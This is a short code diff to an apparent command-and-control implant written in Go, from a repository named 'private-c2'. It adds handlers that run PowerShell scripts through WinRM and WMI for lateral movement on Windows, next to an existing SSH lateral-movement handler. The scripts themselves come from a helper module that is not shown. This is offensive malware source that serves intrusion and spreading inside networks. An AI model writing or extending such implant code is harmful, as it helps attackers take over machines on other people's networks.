@@ -3,9 +3,32 @@ package main
 import (
 	"context"
 	"fmt"
+	"runtime"
 
 	"github.com/azizbinmohammad/private-c2/implant/modules/lateral"
 )
+
+func handleLateralWinRM(ctx context.Context, args string) (string, error) {
+	req, err := lateral.ParseWinRMRequest(args)
+	if err != nil {
+		return "", err
+	}
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("lateral_winrm requires Windows PowerShell Remoting")
+	}
+	return runPowershell(ctx, lateral.WinRMScript(req))
+}
+
+func handleLateralWMI(ctx context.Context, args string) (string, error) {
+	req, err := lateral.ParseWMIRequest(args)
+	if err != nil {
+		return "", err
+	}
+	if runtime.GOOS != "windows" {
+		return "", fmt.Errorf("lateral_wmi requires Windows PowerShell")
+	}
+	return runPowershell(ctx, lateral.WMIScript(req))
+}
 
 func handleLateralSSH(ctx context.Context, args string) (string, error) {
 	req, err := lateral.ParseSSHRequest(args)
